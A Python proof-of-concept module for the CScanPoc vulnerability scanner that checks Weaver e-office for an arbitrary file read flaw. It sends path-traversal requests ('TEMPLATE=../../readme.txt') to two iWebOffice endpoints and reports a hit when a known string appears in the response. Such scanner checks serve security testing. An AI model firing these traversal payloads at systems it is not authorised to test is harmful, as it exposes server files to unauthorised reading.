# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import re


class Vuln(ABVuln):
    vuln_id = 'weaver_0041'  # 平台漏洞编号，留空
    name = '泛微e-office 任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-07-11'  # 漏洞公布时间
    desc = '''
        作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，包括面向大中型企业的平台型产品e-cology、面向中小型企业的应用型产品e-office、面向小微型企业的云办公产品eteams，以及帮助企业对接移动互联的移动办公平台e-mobile和帮助快速对接微信、钉钉等平台的移动集成平台等等。
        泛微e-office两处任意文件读取漏洞。
        iweboffice/officeserver.php
        iWebOffice/OfficeServer2.php
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0125638'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6761e86b-553b-4aa2-beab-844c673f8786'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0125638
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                arg + '/iweboffice/officeserver.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../readme.txt',
                arg + '/iWebOffice/OfficeServer2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../readme.txt'
            ]
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)
                if (code == 200) and ('86-021-68869298' in res):
                    #security_hole('Arbitrarily file download: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
